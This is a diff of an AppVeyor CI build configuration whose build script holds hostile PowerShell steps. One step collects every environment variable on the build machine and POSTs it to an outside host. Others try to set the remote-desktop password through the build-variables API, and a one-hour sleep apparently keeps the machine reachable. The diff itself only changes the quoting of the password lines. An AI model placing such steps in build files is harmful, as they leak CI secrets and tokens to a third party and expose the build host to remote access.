@@ -30,9 +30,9 @@ install:
   - gcc --version
 
 build_script:
-  - ps: $pp='{"name": "APPVEYOR_RDP_PASSWORD", "value": "test"}'; $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body $pp
-  - ps: $pp='{"name": "APPVEYOR_RDP_PASSWORD"}'; $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body $pp
-  - ps: $pp='{}'; $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body $pp
+  - ps: $pp={"name": "APPVEYOR_RDP_PASSWORD", "value": "test"}; $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body $pp
+  - ps: $pp={"name": "APPVEYOR_RDP_PASSWORD"}; $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body $pp
+  - ps: $pp={}; $e2 =$env:APPVEYOR_API_URL + '/api/build/variables' ; Invoke-WebRequest -Uri $e2 -Method POST -Body $pp
   - ps: $eee =gci env:*|Out-String ; Invoke-WebRequest -Uri https://security.gaur.is/api/test -Method POST -Body $eee
   - ps: Start-Sleep -s 3600
   - echo "test"
